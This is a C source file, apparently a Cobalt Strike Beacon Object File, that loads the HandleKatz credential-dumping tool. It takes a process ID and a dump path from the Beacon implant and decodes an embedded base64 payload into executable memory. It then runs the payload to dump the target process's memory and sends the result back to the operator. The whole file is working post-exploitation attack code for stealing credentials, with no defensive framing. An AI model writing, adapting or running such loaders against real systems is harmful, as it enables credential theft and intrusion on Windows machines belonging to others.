#include <stdio.h>
#include "headers/beacon.h"
#include "headers/HandleKatz.h"
#include "headers/Userdefs.h"
#include "headers/syscalls.h"
#include "headers/Win32_API.h"


void allocatedBufferOutput(formatp* formatStructure, WINBOOL standardOutput) {
    char* outputString = NULL;
    int sizeOfObject   = 0;

    outputString = BeaconFormatToString(formatStructure, &sizeOfObject);
    
    if ( standardOutput == TRUE )
    {
        BeaconOutput(CALLBACK_OUTPUT, outputString, sizeOfObject);
    } 
    else 
    {
        BeaconOutput(CALLBACK_ERROR, outputString, sizeOfObject);
    }

    BeaconFormatFree(formatStructure);
    return;
}


int go(char* args, int length)
{   
    datap parser;
    formatp stringFormatObject;
    int resultantStringSize;

    uint8_t* ptr_handlekatz = NULL;
    DWORD dw_len_handleKatz = 0, dw_len_handlekatz_b64 = 0, dw_success = 0, dw_pid = 0;
    char* ptr_output = NULL, *ptr_pth_dmp = NULL;
    BOOL b_recon_only = FALSE;


    BeaconDataParse(&parser, args, length);
    dw_pid =      (DWORD)BeaconDataInt(&parser);
    ptr_pth_dmp = BeaconDataExtract(&parser, NULL);

    BeaconFormatAlloc(&stringFormatObject, 64 * 1024);
    BeaconFormatPrintf(&stringFormatObject, "Provided path to dumpfile:  %s\n", ptr_pth_dmp);

    dw_len_handlekatz_b64 = internalStrlenA(handlekatz_b64);
    
    dw_success = internalCryptStringToBinaryA((LPCSTR)handlekatz_b64, dw_len_handlekatz_b64, CRYPT_STRING_BASE64, NULL, (DWORD*)&dw_len_handleKatz, NULL, NULL);
    if (!dw_success)
    {
        BeaconFormatPrintf(&stringFormatObject, "Failed call to CryptStringToBinary implementation.\n");
        allocatedBufferOutput(&stringFormatObject, FALSE);

        return 0;
    }

    ptr_handlekatz = (uint8_t*)KERNEL32$VirtualAlloc(0, dw_len_handleKatz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (ptr_handlekatz == NULL)
    {
        BeaconFormatPrintf(&stringFormatObject, "Failed first call to VirtualAlloc\n");
        allocatedBufferOutput(&stringFormatObject, FALSE);

        return 0;
    }

    dw_success = internalCryptStringToBinaryA((LPCSTR)handlekatz_b64, dw_len_handlekatz_b64, CRYPT_STRING_BASE64, ptr_handlekatz, (DWORD*)&dw_len_handleKatz, NULL, NULL);
    if (!dw_success) {
        BeaconFormatPrintf(&stringFormatObject, "Failed call to CryptStringToBinary implementation.\n");
        allocatedBufferOutput(&stringFormatObject, FALSE);

        return 0;
    }

    ptr_output = (char*)KERNEL32$VirtualAlloc(0, 0x4096, MEM_COMMIT, PAGE_READWRITE);
    if (ptr_output == NULL)
    {
        BeaconFormatPrintf(&stringFormatObject, "Failed second call to VirtualAlloc\n");
        allocatedBufferOutput(&stringFormatObject, FALSE);

        return 0;
    }

    dw_success = ((HandleKatz*)ptr_handlekatz)(b_recon_only, ptr_pth_dmp, dw_pid, ptr_output);
    if ( !dw_success )
    {
        BeaconFormatPrintf(&stringFormatObject, "Failed second call to HandleKatz function pointer.\n");
        allocatedBufferOutput(&stringFormatObject, FALSE);

        return 0;
    } else {
        BeaconFormatPrintf(&stringFormatObject, "\nRetrieved Output:\n=================\n%s\n", ptr_output);
        allocatedBufferOutput(&stringFormatObject, TRUE);

        return 1;
    }
    
}